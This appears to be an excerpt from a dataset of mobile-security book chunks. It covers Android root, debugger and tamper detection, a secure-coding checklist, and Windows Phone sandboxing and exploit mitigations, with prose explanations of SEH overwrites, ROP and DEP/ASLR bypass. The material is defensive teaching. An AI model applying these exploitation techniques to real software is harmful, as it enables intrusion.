provides the full path to su if\nit is available on the device. The which tool is not a standard binary that is provided on Android and you should\nnot rely on its being present. Instead you should create a function that operates in the same manner as which.\nThis would involve decomposing the PATH environmental variable into its separate directories and searching\nthem for the provided binary.\nAlthough searching for the su binary certainly is valid, it is not sufficient on its own to determine whether the\nowner of the device can obtain root. You could also perform the following additional checks:\nRead the default.prop file located on the root of the Android filesystem. An attribute in this file called\nro.secure indicates what privileges are associated with an ADB shell when the connection is made from a\ncomputer. If this value equals 0, then ADB starts with root privileges and this is an indication that the user\ncan obtain a root shell when connecting to the device using adb shell.\nCheck whether the adbd program has been started by the root user. You can see this by invoking the standard\nps binary and parsing the output.\nCheck for common emulator build properties through the use of the android.os.Build class. The following\nsystem properties can be checked against the provided regular expression to see whether the application is\nrunning inside an emulator:\nBuild.TAGS = \"test-keys\"\nBuild.HARDWARE = \"goldfish\"\nBuild.PRODUCT = \"generic\" or \"sdk\"\nBuild.FINGERPRINT = \"generic.*test-keys\"\nBuild.display = \".*test-keys\"\nThe existence of one or more of these values would indicate that the application is running on an emulator.\nIterate through the labels of installed applications using the PackageManager class and look whether they\ncontain the words 'SuperSU', 'Superuser', and other common applications used to control root access. This\nis a much better way to check for the existence of an application on a device rather than checking for the\nexistence of its APK file in a certain directory. The APK may be renamed by developers of the application or\nbe installed in a different place to the commonly checked /system/app/ directory. The installed package\nnames of these applications could also be searched; for example, 'com.noshufou.android.su'and\n'eu.chainfire.supersu'. This check is the least reliable because the user could have just installed a root\nmanager application from the Play Store without actually having root access. However, if the user managed\nto install the root manager's APK somewhere inside the /system folder, then this indicates that he had\nprivileged access to the device at some point.\nDebugger Detection\nA reverse engineer who needs to manipulate code inside your application can do so by using a debugger attached\nto the device. However, this technique can only be used if your application is marked as debuggable. A reverse\nengineer may have modified the application's manifest to include android:debuggable=”true” or used a runtime\nmanipulation tool that makes the process debuggable in order to achieve this.\nYou can perform a check to make sure that the application is not set as debuggable by implementing the\nfollowing code:\nboolean debuggable = (getApplicationInfo().flags &\nApplicationInfo.FLAG_DEBUGGABLE) != 0;\nAnother measure that you could implement is to periodically check whether an application has a debugger\nattached to it by using the isDebuggerConnected() method provided in the android.os.Debug class.\nThese approaches do not provide an infallible way of preventing application debugging but will certainly slow\ndown a reverse engineer who has not taken the time to defeat these checks.\nTamper Detection\nAn application can be designed to fail to run if it detects signs of modification of its APK file. This technique is\ncommonly known as tamper detection. The following code snippet shows how an application can check whether\nits APK has been changed and resigned. Specifically, it checks the signature of the signing certificate used\nagainst a known good value.\npublic boolean applicationTampered(Context con)\n{\nPackageManager pm = con.getPackageManager();\ntry\n{\nPackageInfo myPackageInfo = pm.getPackageInfo(con.getPackageName(),\nPackageManager.GET_SIGNATURES);\nString mySig = myPackageInfo.signatures[0].toCharsString();\n//Compare against known value\nreturn !mySig.equals(\"3082...\");\n}\ncatch (NameNotFoundException e)\n{\ne.printStackTrace();\n}",
    "question": "What are the key security measures that developers should implement to prevent vulnerabilities in Android applications?",
    "summary": "This chapter discusses how to write secure Android applications by implementing security mechanisms to prevent common vulnerabilities. It covers reducing attack surfaces by limiting entry points, securing data storage, and using proper permissions. Additionally, it provides guidance on securing components like activities, content providers, and webviews, as well as using encryption, preventing native code exploitation, and detecting root or debuggers. The chapter emphasizes the importance of using secure practices such as SSL certificate pinning, avoiding cleartext communication, and ensuring that all security measures are properly configured."
  },
  {
    "start": 51,
    "end": 54,
    "text": "return false;\n}\nA reverse engineer could certainly patch these checks or defeat them in some other way; however, it is an\nannoyance. Upon failing the tamper detection check, the app could also transmit information about the device\nto the application developer so that he is aware that someone is attempting to modify the application, possibly\nin an attempt to crack it and make it available on the Internet. Paid products that provide code obfuscation also\noften provide tamper detection. If paying for tamper detection code is a better option, refer to the “Obfuscation”\nsection earlier in this chapter for some options.\nSummary\nWhen creating an Android application, you must consider many security aspects. However, the security\nfunctionality provided by the Android platform is rich and strong security mechanisms can be created using\nbuilt-in features. The following is a list of security checks provided in this chapter that you can use as input to a\nsecurity assessment of your application. The items on this checklist are most of the time not fully attainable but\nshould be seen as an ideal to strive toward.\nCheck that all code paths into application components expose only the functionality that is intended.\nMinimize the storage of user data down to the essentials.\nLimit interaction with untrusted sources and scrutinize any outside interaction.\nVerify that the minimum possible set of permissions have been requested by the application.\nEnsure that no unintended files are bundled inside the APK.\nAssign permissions to all exported application components.\nDefine a protection level of signature to all custom permissions.\nEnsure that tapjacking attacks cannot be performed on any sensitive View within the application.\nEnsure that sensitive inputs do not store any typed-in words into the Android dictionary.\nEnsure that activities that extend PreferenceActivity correctly verify the requested fragment.\nEnsure that login activities do not contain a way for a user to open authenticated activities prior to passing\nauthentication checks.\nEnsure that all inputs for user passwords are appropriately masked.\nEnsure that BROWSABLE activities do not expose any way for a malicious website to misuse functionality\nwithin the activity.\nEnsure that content providers that do not intend to be exported have this explicitly set in their manifest\ndeclarations.\nEnsure that content providers do not have SQL injection vulnerabilities.\nEnsure that file-backed content providers do not provide access to unintended files.\nEnsure that pattern-matching flaws do not exist on any paths protected by permissions.\nEnsure that secret codes have been removed and if they have not that they only provide intended\nfunctionality.\nSet restrictive file permissions on files stored inside the private data directory.\nPay attention to the sensitivity of files stored on the SD card.\nEnsure that sensitive files stored anywhere on the filesystem are encrypted.\nEnsure that encryption keys are not hard-coded in the source or stored insecurely.\nEnsure that encryption keys were generated using best practices.\nEnsure that files that have to be shared with other applications do not expose these files in an insecure way\nand make use of a content provider and the Grant URI permission functionality.\nEnsure Grant URI functionality makes use of an explicit intent when allowing access to another application.\nEncrypt all communications to the Internet using well-known standards.\nAdd an additional transport layer security mechanism such as SSL certificate pinning on all communications\nto the Internet.\nEnsure that no certificate checking bypass code has been used to allow invalid SSL certificates.\nUse only standard IPC mechanisms provided by Android.\nEnsure that WebViews are not loading any cleartext content.\nUse targetSdKVersion and minSdkVersion of 17 or higher when making use of a WebView with a\nJavaScriptInterface.\nLock each WebView down to its tightest possible configuration with features that affect security being disabled\nwherever possible.\nEnsure that backing up the application content using ADB backup functionality is not possible.\nEnsure that the application is not marked as debuggable.\nUse the highest possible API version in targetSdKVersion and minSdkVersion in the manifest as well as in\nAPP_PLATFORM for native code.\nEnsure that the application does not log sensitive data.\nInspect the quality of the native code for memory corruption flaws.\nScrutinize all entry points into native code and reduce them where possible.\nEnsure that all possible exploit mitigations are present on compiled native code.\nImplement protection level downgrade detections.\nEnsure that non-exported application components cannot be invoked by a privileged user because of the\nimplemented token system.\nRigorously obfuscate all code.\nImplement root detection checks.\nImplement debugger detection checks.\nImplement tamper protection checks.\nCHAPTER 10\nAnalyzing Windows Phone Applications\nWindows Phone (WP) 8 and 8.1 are arguably two of the most secure mobile operating systems on the market at\nthe time of this writing. Indeed, in contrast to other mobile operating systems such as iOS and Android, WP8\nand 8.1 and their Original Equipment Manufacturer (OEM) devices have not been publicly vulnerable to a long\nstring of jailbreaking and security vulnerabilities.\nWindows Phone 8 and 8.1 are built on top of the NT kernel technology. The older Windows Phone OSes, 7.x\n(and the even older Windows Mobile OSes) differ from Windows Phone 8.x in that their cores were made up of\nthe CE kernel instead.\nThe market has shifted recently. Whereas Windows Phones previously seemed quite far behind the rest of the\nmobile arena, their market share increase now places them in third place, one place higher than BlackBerry\ndevices. This makes Windows Phone devices very viable options for Windows Phone development, and as a\nconsequence, application security research.\nIn this book we stick to the more recent Windows Phone operating systems, WP8 and WP8.1, though much of\nthe content we discuss in the following four chapters may be relevant when assessing legacy WP7 applications\nas well.\nBefore delving into attacking and code auditing Windows Phone 8 and 8.1 applications in Chapter 11, this\nchapter first explores Windows Phone 8 and 8.1’s various security features, and then covers how to build an\nenvironment suitable for carrying out security reviews and exploration activities on Windows Phone 8 and 8.1\napps.\nUnderstanding the Security Model\nIt’s important to understand the host’s OS security model before carrying out application security assessments\nto gain an appreciation for how apps are able to interact with each other and with the OS at large. Windows\nPhone is not just Windows on a phone. It is a much more closed operating system than standard Windows, and\napps are much more restricted.\nThis section introduces Windows Phone’s security model and other security-related aspects of the OS so that\nyou become aware of how exposed an app and its data is to attacks by other apps (consider malicious apps on a\ndevice) and exploit attempts in general. Other security features are also introduced, including device encryption\nand exploit mitigation technologies.\nCode Signing and Digital Rights Management (DRM)\nWindows Phone 8, by default, is a closed computing platform. On locked devices (that is, non-developer\nunlocked) all code must first be signed by Microsoft in order to run, much the way Apple requires that code have\na signed a binary for it to run on non-jailbroken iOS devices.\nThe majority of applications consumed by Windows Phone 8 users are obtained via the Windows Phone Store.\nAll applications submitted to the Store are subject to a Microsoft-defined submission process (more on this\nlater), before being accepted and code signed with a certificate issued by the aptly named Certification Authority,\nMicrosoft Marketplace CA. Signed apps are then made available for purchase or free download to the general\npublic who own Windows Phone 8 devices.\nIn addition to being code signed, applications from the Store are protected using the FairPlay DRM technology.\nTampering with the XAP or APPX files being installed results in the installation being halted.\nNote that not all applications have to be Microsoft signed to run on WP8 or 8.1 devices. When developer mode is\nunlocked on a device, applications can be sideloaded, but in the context of Store applications running on the\ndevice of a standard consumer, all apps must be signed. (More on sideloading and its applicability to penetration\ntesting appears later in this chapter.)\nApplication Sandboxing\nIn line with Windows Phone 8.x’s closed architecture, applications are sandboxed to control their access to\nsystem resources and to prevent them from accessing other applications’ data. In Windows Phone 8.x realm, all\nthird-party applications from the Store run in AppContainers. This section briefly discusses what an\nAppContainer is and what it means for standard applications in terms of privileges, security, and segregation of\napplications.\nAppContainer\nThe AppContainer at a high level can be considered a process-isolation mechanism that offers fine-grained\nsecurity permissions governing which operating system resources, such as files, the registry, and other\nresources, that contained applications can access and interact with.\nBecause all third-party WP8 and WP8.1 applications run inside an AppContainer, each app can access only its\nown private file sandbox; any attempts to read or write outside of it, including into another application’s data\nsandbox, fail. Similarly, any attempts to write into the registry also fail, though some of the registry is readable\nby standard third-party apps.\nChambers and Capabilities\nThe ability of an application to access functionality offered by the OS and its services, such as the camera or\nnetworking, is controlled by that app’s capabilities. The Windows Phone 8 security model is based on the\nconcept of least privilege, and as such, every application on a device is running inside one of two distinct\nsecurity chambers.\nIn the Windows Phone 8 and 8.1 security architecture, the two chambers are the Least Privilege Chamber (LPC)\nand the Trusted Computing Base (TCB). All applications run in the notional LPC chamber, whether they are\nMicrosoft-written services, OEM services, or just third-party Store applications. Even some device drivers run in\nthe LPC. The only code that runs in the TCB chamber are kernel components. Figure 10.1 represents this\nchamber architecture graphically.\nFigure 10.1 Windows Phone 8.x chamber architecture\nWindows Phone 8 and 8.1 implement the principle of least privilege by quite severely restricting the freedom of\napplications running in the LPC, by default. By least privileges enforcement, so few permissions are granted to\napps by default that tasks such as networking, camera use and access to user contacts (for example) are not\npossible. For an application to be able to undertake serious tasks that are expected of modern smartphone apps,\nprivileges have to be granted to it. At install time, applications “ask” for additional privileges by requesting\ncapabilities.\nWhen developers create WP8 applications, they must specify which capabilities their application requires in\norder to carry out its tasks and provide its functionality. For example, here are several typical capabilities that\nStore Windows Phone apps commonly request:\nID_CAP_NETWORKING—Outbound and inbound network access\nID_CAP_PHONEDIALER—Access to the dialer functionality\nID_CAP_MICROPHONE—Access to the microphone API\nID_CAP_LOCATION—Access to geolocation data\nID_CAP_ISV_CAMERA—Access to device’s built-in camera\nIn the context of a Windows Phone 8.1 app, you can specify capabilities in its Package.appxmanifest file and use\ndifferent names; for example, internetClient in APPX manifests provides similar capabilities as\nID_CAP_NETWORKING. Developers specify capabilities to be requested at install either via the Manifest Designer\ninterface or by manually editing the application manifest XML files—WMAppManifest.xml or\nPackage.appxmanifest. (You can find more information about these files, in the “Application Manifests” section\nof this chapter).\nAt install time for an application, its manifest file is parsed for capabilities. Certain privileges, such as\nID_CAP_LOCATION, result in the user’s being prompted for permission to grant the capability to the app, since\ngeolocation data can be considered sensitive information. Other permissions such as ID_CAP_NETWORKING, on the\nother hand, are granted automatically, thus any third-party may use the OS’ networking APIs without the device\nuser having to specifically authorize it via an install time prompt. Requests for powerful capabilities that are\nonly meant for Microsoft and OEM software, such as ID_CAP_INTEROPSERVICES, are denied by the OS, and third-\nparty apps requesting such capabilities will not install.\nOnce the capabilities have been parsed out from the manifest and granted or denied (either automatically or by\nthe user’s acceptance or denial), the application’s chamber is then provisioned with these granted capabilities.\nThe app is then accordingly restricted by the security boundary the chamber presents, and it cannot go beyond\nthat container by attempting to access APIs that it does not have the capabilities for. This summarizes the least\nprivileges principle; if an app does not have the correct capabilities to access a particular API, the OS will deny\naccess to it if the app attempts to use it.\nEach time the application runs, its process executes in an AppContainer whose privileges reflect those of the\ncapabilities granted to it.\nThe access controls enforced by WP8.x’s security model have been implemented using NT kernel’s security\nprimitives: tokens and Security IDs (SIDs), where every AppContainer has its own capability SID, which is used\nto check with Access Control Lists (ACLs) whether or not the process has permission to carry out the action\nrequested.\nData Encryption ‘At Rest’\nWhen you are reviewing apps from a security standpoint it’s helpful to understand the current state of data\nencryption for the data stored on a Windows Phone 8.x device or on an accompanying SD card.\nChiefly, it’s important to know how well protected application data is if a device is lost or stolen, and an attacker\nextracts the flash storage module in an attempt to extract and use data on the device.\nThe current status quo for encryption on standalone (non-corporate) and even some corporate-enrolled devices\nmay surprise some readers.\nWe’ll discuss the general status of device and SD card encryption in the following two short sections.\nInternal Storage Volume\nAt the time of this writing, data on devices running both Windows Phone 8 and Windows Phone 8.1 is not\nencrypted by default. Moreover, at present, no public API is available to enable full device encryption on\nunmanaged devices, such as those used by non-business consumers. This is true even when a device has a\npassword set on it; this does not mean that any whole storage encryption has been enabled.\nThe only documented method of encrypting the internal storage volume (i.e., the entire flash storage—the disk)\nis via corporate enrollment and correct configuration of Exchange ActiveSync policies. In particular, the policy\nsetting of interest is RequireDeviceEncryption, as documented in Microsoft’s WP ActiveSync overview\n(http://go.microsoft.com/fwlink/?LinkId=270085).\nWhen encryption is enabled via ActiveSync policy, device encryption in Windows Phone 8 and 8.1 is carried out\nby Microsoft’s BitLocker technology. According to Microsoft documentation, BitLocker uses Advanced\nEncryption Standard (AES) encryption in Chained Block Cipher (CBC) mode, using either a 128- or 256-bit key,\nin combination with the “Elephant” diffuser for security aspects that are particular to disk encryption. The full\ntechnical specifications of BitLocker’s encryption are available athttp://www.microsoft.com/en-\nus/download/confirmation.aspx?id=13866.\nGiven the lack of out-of-the-box storage volume encryption even when a password is applied to Windows Phone\n8 and 8.1 devices, non-enterprise WP8.x phone users at the time of this writing are vulnerable to data theft in\nthe event that their device is lost or stolen, assuming the would-be attacker is able to extract filesystem data\nfrom the flash drive.\nSecure Digital Card Encryption\nWhen BitLocker is enabled on Windows Phone 8 and 8.1, it does not encrypt Secure Digital (SD) card contents.\nIn terms of applications themselves writing encrypted or unencrypted data to the SD card, the conclusion to the\nmatter is quite simple. In Windows Phone 8, Store applications are not capable of writing to SD cards; they only\nhave read-access to the device. Only OEM and Microsoft applications have read- and write-access to SD cards.\nThis has changed, however, in Windows Phone 8.1. Apps in WP8.1 with the removableStorage capability are\nafforded read- and write-access to the SD card.\nSD cards—as data entry points into applications—are discussed in more detail in Chapter 11.\nWindows Phone Store Submission Process\nAs stressed previously, Windows Phone 8 is a closed computing platform. It therefore makes sense that in\naddition to enforcing a strict security model to sandbox apps, Microsoft also reviews all app submissions to the\nStore to ensure that they comply with certain security-related dos and don’ts that Microsoft defines.\nMost obviously the Store submission screening process involves a certain degree of analysis to ensure that\nsubmitted apps are not malware. In this sense submitted applications are vetted for malicious code, and any\ncode that Microsoft considers to be malicious leads to the app’s rejection.\nStill, even if a submitted application is not coded to carry out blatantly malicious actions, certain questionable\nbehaviors may be disallowed and lead to the app’s being rejected. For example, if an application attempted to\nread a file outside of its sandbox for seemingly innocuous purposes, the app would most likely be refused, even\nthough the action would in the vast majority of cases fail anyway. Similarly, accessing registry keys that are\nreadable may also be considered questionable, and could lead to rejection of the app submission. Exact patterns\nof behavior that are prohibited by Microsoft are not available to the general public, but even accidental or\ninnocuous naïve attempts to breach the sandbox model would most likely be considered inappropriate and\nwould be a reason for rejection.\nAnother pattern of behavior that could be implemented by a well-meaning developer but is prohibited includes\n“altering” an application’s behavior after the application has been accepted and certified by the Store. This may\ninclude an application’s downloading a JavaScript file and executing it, for example. Notably, this sort of\nbehavior is allowed in iOS apps, for example, but not in WP8.x apps at the present time.\nAlthough Windows Phone 8 and 8.1 fully support native code applications (such as C, C++), restrictions are\nimposed on the use of native-like features in C# applications. In particular, Store applications are not allowed to\ncontain “unsafe” code, meaning code that uses the unsafe and fixed keywords to deal ‘directly’ with pointers.\nMicrosoft also forbids calling into certain (but not all) Win32 APIs via C#’s P/Invoke interface, presumably for\nsecurity reasons. See http://msdn .microsoft.com/en-us/library/windowsphone/develop/jj207198(v=vs.105)\n.aspx for an exhaustive list of “allowed” APIs for invocation via P/Invoke.\nDespite such restrictions on use of native code and features by managed apps (such as C#), rather interestingly\nthere are technically no restrictions on the use of APIs such as strcpy(), *sprintf(), strcat(), and so on.\nAlthough the use of potentially unsafe APIs may be flagged as errors by Visual Studio, such deprecation errors\ncan be disabled, and Microsoft has not explicitly banned dangerous API usage in WP native apps at this time.\nEqually, as with iOS apps, for example, behavior such as storing the user’s app password in cleartext is not\nactually prohibited, despite its being a bad security practice. In this sense, although the Store does vet for certain\ninsecurities, the Store’s vetting process could be considered more of a screening for deliberate malware than for\napps that are poorly written from a security perspective. The vetting process aims to catch attempts to engage in\ndisallowed activity, but the process does not have heavy emphasis on preventing an app from being insecure in\nitself.\nA notable difference in the submission procedure for WP8.1 apps versus WP8 apps is that APPX packages must\npass the tests in the Windows App Certification Kit (WACK). This includes several security-related tests\nincluding BinScope binary analyzer tests, which test for the presence of security-related binary protections such\nas Address Space Layout Randomization (ASLR). Security checks that must pass for WP8.1 certification are\navailable on MSDN (http://msdn.microsoft.com/en-\nus/library/windowsphone/develop/dn629257.aspx#background_security).\nTo conclude this discussion of submission processes, it’s worth discussing and considering how successful\nMicrosoft’s procedures and policies are at keeping malicious apps out of the Store in comparison to other\nmobile operating systems. As of May 2014, information on confirmed cases of malware is scarce. Based on\nWindows Phone 8’s initial release date, around October 2012, we could conclude that this is a good track record.\nThis number fares slightly better than iOS, and very similarly to BlackBerry; both of these platforms also have\nproper submission vetting processes.\nThis number is also in stark comparison to Android, where some sources estimate that around 97% of mobile\nmalware is targeted at the Android platform (http://www.forbes.com/sites/gordonkelly/2014/03/24/report-\n97-of-mobile-malware-is-on-android-this-is-the-easy-way-you-stay-safe/). This statistic presents little\nsurprise when one considers that the Google Play Store (formerly Marketplace) does not have genuine approval\nprocedures.\nSomewhat similarly, there have been several high profile malware outbreaks that have targeted jailbroken iOS\ndevices in recent years. There are no comparable incidents that concerned Windows Phone devices, though\nabsence of evidence does not constitute evidence of absence.\nIn addition to security requirements for certification a whole host of other non-security related dos and don’ts\nexist, many of which revolve around performance and management of the app’s resources, and not impeding the\nowner’s normal usage of the phone. For the interested reader a full list of certification requirements for\nWindows Phone 8/8.1 applications is available on MSDN at http://msdn.microsoft.com/en-\nus/library/windowsphone/develop/hh184844(v=vs.105).aspx.\nExploring Exploit Mitigation Features\nSimilarly to most modern operating systems, the Windows Phone 8 and 8.1 platforms both feature a number of\nexploit mitigation technologies. Such technologies aim to raise the difficulty associated with exploiting memory\ncorruption vulnerabilities. The days of simply overwriting a return address or Structured Exception Handler\n(SHE) entry in a stack overflow are all but gone, as are the days of exploiting the “write-what-where” primitive\nin a classic safe unlinking heap overflow.\nExploit mitigation features are present not only to stop buggy apps from being exploited, but also to try to\nprevent apps (such as malware and community home brew apps) from exploiting vulnerabilities in the\nunderlying OS and kernel to carry out “jailbreak”-like attacks.\nThis section briefly discusses the portfolio of exploit mitigation features present in WP8 and 8.1, some details\non how they work, and techniques that are used to sometimes bypass or overcome the protections each\ntechnology aims to provide. These discussions are only applicable to native code, because managed code is\ngenerally immune to memory corruption bugs in the traditional sense.\nBear in mind, however, that some Windows Phone 8 and 8.1 applications are written in a managed language but\nalso call into native code modules. Consider a C# application, for example, that calls into native code via the\nP/Invoke interface.\nLater this section also covers how you can check whether third-party applications have these mitigation features\nenabled on their binaries for when you are carrying out security assessments; see “Analyzing Application\nBinaries” later in this chapter.\nStack Canaries\nStack canaries, also known as stack cookies, are random values that are placed prior to critical data such as stack\nmetadata (for example, return addresses). When the executing function returns, the value is checked to see\nwhether it matches the expected value. If it does, the program execution continues, and if it does not, it has\nclearly been overwritten at some point during the function’s execution, and the application terminates\nimmediately.\nStack canaries are placed between the last local stack variable and the padding that precedes the saved frame\npointer (SFP). Figure 10.2 demonstrates the setup.\nFigure 10.2 Stack frame with cookies\nClearly, if a stack overrun occurs (such as via an unsafe strcpy() call), and the stack buffer’s bounds are\nbreached, the cookie value will be overwritten, and the cookie check prior to function return will inevitably\nresult in program termination, unless the attacker was extremely lucky and managed to guess the correct cookie\nvalue.\nStack cookie protection is enabled via the /GS compiler flag. This option was first introduced in Visual Studio\n2002, and is on by default, thus there is no need to manually enable it when compiling applications.\nAlthough stack canary technology protects against traditional stack overflow exploitation techniques, the\nfeature, in principle, wouldn’t guard against consequences of an overflow that may be exploitable before the\napplication terminates. For example, an important pointer may be overwritten and written to before the cookie\ncheck happens. In practice, however, /GS may also do variable reordering, precisely for the purpose of trying to\nprevent important pointers and variables from being overwritten and the protections being ineffective.\nAddress Space Layout Randomization\nAddress Space Layout Randomization (ASLR) is an exploit mitigation feature that revolves around randomizing\nthe memory location of a process’s image and its various loaded DLL modules. That is to say, the base address of\nan application or loaded module will not stay constant between runs or loads, respectively.\nThe whole purpose of ASLR is to make accurately predicting the layout and overall structure of memory within a\nprocess very difficult for attackers. The value of doing this, though, is made apparent by considering how several\nclasses of memory corruption vulnerabilities were traditionally exploited.\nTake stack-based buffer overflows as an example. Before the advent of ASLR in highly targeted applications,\nexploit writers most often overwrote a stack frame’s return address with a hard-coded, predetermined address.\nThe nature of the data at this address generally varies by the operating system being exploited. Most exploits for\nUNIX-like systems overwrite the return address in question with the location of their shellcode on the stack, or\nthe address of a library function (so-called return-to-libc).\nThe majority of Windows exploits writers tended to overwrite return addresses with the location of a CALL ESP\nor JMP ESP instruction for which they had predetermined the address on particular versions of Windows.\nIn both cases, return addresses (or function pointers) were overwritten with addresses that were known to be\nstable; hence, exploits had a good chance of succeeding even though the overwrite address was hard-coded.\nHowever, with the introduction of ASLR into mainstream OSes, exploitation techniques have necessarily\nchanged somewhat. When an application has ASLR enabled on its binary, attempts to redirect execution flow\ninto stack-based shellcode via a hard-coded address is likely to fail, because the location in memory of the stack\nbuffer in question will be randomized, and guessing it would be potluck.\nIn Windows exploits, where an attacker would often hardcode a return address that pointed to JMP ESP or CALL\nESP instructions in KERNEL32.DLL (for example), such an attack would be hard to use with ASLR, because the\nlocation of the function containing the JMP ESP or other desired instruction would no longer be stable or even\npredictable.\nAlthough this would appear to be a solid and unforgiving mitigation against fairly trivial memory corruption\nexploits, adoption problems have limited its range of effectiveness in the past.\nWhen ASLR was introduced in Windows Vista Beta 2 (circa mid-2006), only Microsoft applications had ASLR\nsupport compiled into them, and this included applications and DLL modules. Software written by third-party\ndevelopers had to opt into ASLR, by choosing to compile support into their binaries. So, if a hacker were trying\nto write an exploit for a stack overflow in Microsoft Office, the location of his previously predictable JMP ESP (or\nwhatever) instruction was now randomized, and his job as an exploit writer became somewhat more difficult.\nIn third-party software on the other hand, where ASLR was frequently not compiled in, the exploit writer’s job\nwas often just as easy as before ASLR was even introduced into Windows. Applications and their modules would\nbe loaded at their preferred, stable base address, and an attacker’s exploit methodology would remain the same\nas before.\nSince then, however, Microsoft has standardized ASLR’s adoption of third-party native applications. Indeed,\nVisual Studio now enables ASLR’s compiler flag, /DYNAMICBASE, by default, and a developer would have to\ndeliberately disable it for the distributed binary to be unprotected (and there are legitimate reasons for doing\nso). Moreover, since a certain Windows 7 update, there has been a feature known as “Force ASLR,” which\napplications can opt into to ask the kernel to load modules at randomized addresses even when they have been\nbuilt with the /DYNAMICBASE flag. These features are also common to the more recent Microsoft mobile operating\nsystems, WP8 and WP8.1.\nThis is definitely good news from a security perspective and means that native applications in Windows Phone 8\nand 8.1 are likely to be in good shape in regard to thwarting the use of stable memory addresses in exploits.\nThat’s not to say that ASLR is perfect and can’t be effectively bypassed (for example, using pointer leaks or heap\nspraying/JIT spraying), but its implementation in Windows 8.x operating systems has seen various\nimprovements since its introduction in Windows Vista, and as such, its use in WP8 and WP8 native applications\nby default (in Visual Studio compilation options) definitely makes exploitation efforts a bit harder from the\nattacker’s perspective. WP8.1 native modules must have ASLR enabled on binaries to pass the certification\nprocess (see http://msdn.microsoft.com/en-us/library/windowsphone/develop/hh184844(v=vs.105).aspx).\nData Execution Prevention\nData Execution Prevention, known commonly as DEP, is an exploit mitigation feature whose job it is to prevent\nthe processor from executing code that resides in memory regions known to contain data rather than code.\nThis is a desirable thing, because many exploits rely on redirecting program execution flow into shellcode that\nresides in stack or heap buffers. It is intuitively quite obvious that legitimate executable code should not reside\nin stack and heap memory regions (among others), because these memory areas are intended for application\ndata. Hence, no good reason exists to allow code execution in these areas. This is the concept behind DEP:\npreventing code execution in memory spaces that are known to house data rather than code.\nDEP is not exclusively a compiler-based and kernel-based option; its enforcement relies on CPU support as well.\nWith binaries that are compiled for x86 processors, the /NXCOMPAT flag informs the kernel to enforce DEP on the\napp if the host CPU supports the no-execute page-protection feature—No eXecute (NX) on AMD, and the\nExecute Disable Bit (XD) on Intel. In the context of Windows Phone 8 and 8.1 devices, whose processors are\neither ARMv6 or ARMv7, this bit is known as XN—eXecute Never.\nWhen running on 64-bit architectures, the /NXCOMPAT flag has no effect; all applications run with DEP enabled,\nunless the app is running in WOW64 mode—Windows 32-bit on Windows 64-bit, as documented by the Visual\nC++ team (http://blogs.msdn.com/b/vcblog/archive/2009/05/21/dynamicbase-and-nxcompat.aspx).\nBecause DEP generally prevents immediate execution of shellcode given that it usually resides in pages with the\nNX or XD flags enabled, exploit writers have had to employ alternative routes to achieve meaningful code\nexecution.\nThe methods most often used revolve around reusing code fragments that are already loaded into memory and\nreside in pages that do not have NX/XD/XN flags enabled on them. This is known as Return-Oriented\nProgramming (ROP), and the basis of this method involves chaining together small fragments of already-\npresent code (known as ROP gadgets) until a useful task has been carried out. Some ROP chains are skillfully\nconstructed (or via a tool such as ROPGadget; see http://shell-storm.org/project/ROPgadget/) to make up\ncomplete shellcode-like instruction chains, whereas some result in a call to VirtualProtect() to remove the\nNX/XD bit from the page(s) containing the attacker’s shellcode, which will then be jumped into and executed,\nthereby bypassing DEP’s protection.\nThe ROP technique relies on non-ASLR modules being loaded into the process being exploited to use a source of\nROP gadgets, but as noted earlier, this has been commonplace with third-party applications.\nAt present, OEM-supplied Windows Phone hardware is ARMv6- and ARMv7-based, and therefore 32-bit\narchitectures. Visual Studio enables the /NXCOMPAT compiler flag by default, thus third-party WP8 applications\nare likely to be built with DEP enabled. WP8.1 must necessarily be compiled with DEP enabled, as per\nMicrosoft’s Store certification requirements for Windows Phone 8.1 apps (as per\nhttp://msdn.microsoft.com/en-us/library/windowsphone/develop/dn629257.aspx).\nThe likely presence of DEP, especially when combined with ASLR, is a positive thing for WP security and adds\nanother level of difficulty to real-world exploitation on the platform.\nSafe Structured Exception Handling\nWhen Microsoft introduced stack cookie protection into its compiler (via the /GS flag) in 2003, it soon became\nclear that the standard return address overwrite was no longer going to be reliable as a stack overrun\nexploitation method.\nThe core of the technique revolved around overwriting structured exception handling (SEH) metadata, and then\ncausing an exception to be thrown. Each thread in a process has at least one SEH record on its stack; each\nexception handler is represented by an EXCEPTION_REGISTRATION_RECORD structure, which consisted of a “Next”\npointer and a function pointer to an exception handler. Figure 10.3 represents this concept graphically.\nFigure 10.3: SEH chain\nBecause EXCEPTION_REGISTRATION_RECORD structures are also located on the stack, along with the overflowable\nstack buffer, the idea was to overflow the susceptible buffer and keep overwriting until an\nEXCEPTION_REGISTRATION_RECORD structure was reached, which would be at some pointer further down the stack.\nThe function pointer in the EXCEPTION_REGISTRATION_RECORD would then be overwritten with a value of the\nattacker’s choice. The attacker would then have to cause an exception to be thrown; a popular way to do this was\nto keep writing data until a guard page at the end of the stack was hit, causing a write access violation. The\nexception dispatcher would enumerate the list of exception handlers for the thread, and as a result the\noverwritten function pointer would be called into, giving execution flow control to the attacker.\nThis lead to Microsoft’s introducing the Safe Structured Exception Handling (SafeSEH) functionality into Visual\nStudio 2003, via the /SAFESEH compiler flag. This exploit mitigation flag prevents the simple technique just\nsummarized from succeeding by inserting code (at compile time) that validates that each SEH handler is found\nin a table of known exception handlers before being executed. Due to peculiarities in the protection, however,\noverwritten exception handlers will still be called if they do not point into the stack, and do not point into the\nmemory space of a loaded module.\nDavid Litchfield published a paper (available at http://www.blackhat.com/presentations/bh-asia-03/bh-asia-\n03-litchfield.pdf) soon after the introduction of /SAFESEH documenting a generic method for its bypass. The\nsolution was to find a suitable instruction on the heap to overwrite the EXCEPTION_REGISTRATION_RECORD\nfunction pointer that would, with details omitted for brevity, cause execution to end up in the attacker’s\nshellcode.\nGiven /SAFESEH’s shortcomings, an accompanying exploit mitigation was introduced to further protect against\nSEH exploitation: SEHOP, which stands for Structured Exception Handling Overwrite Protection. SEHOP\nplaces a cookie at the end of the SEH chain, and then verifies that no EXCEPTION_REGISTRATION_RECORDs have\nbeen modified by walking the chain and verifying that the cookie is the value expected. If this chain validation\nand cookie check fail, the exception handler is not allowed to execute. This works because each\nEXCEPTION_REGISTRATION_RECORD’s Next pointer is situated in front of its function pointer, meaning that any\noverwrite of the structure trashes the Next pointer and the SEH chain is broken. Coupled with ASLR, guessing\nthe correct Next pointer value could prove very difficult. No bypasses are known for SEHOP at the time of\nwriting.\n/SAFESEH is enabled by default in all versions of Visual Studio that are used to compile WP apps, and SEHOP is\nalso implemented in WP8 and 8.1.\nIn addition, WP8.1 native applications must be built with 